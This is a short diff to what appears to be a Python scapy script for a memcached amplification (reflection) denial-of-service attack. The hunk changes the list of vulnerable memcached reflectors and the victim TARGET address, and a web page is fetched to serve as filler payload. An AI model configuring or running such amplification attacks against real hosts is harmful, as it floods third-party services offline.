@@ -27,11 +27,11 @@ from scapy.all import *
 
 # Vulnerable memcached server list
 SERVER_LIST = [
-        '172.17.0.3:11211',
+        '172.17.0.2:11211',
 ]
 
 # Destination 
-TARGET = '172.17.0.2'
+TARGET = '1.2.3.4'
 
 # optional payload to set if no keys exist
 payload = requests.get('https://google.com').text
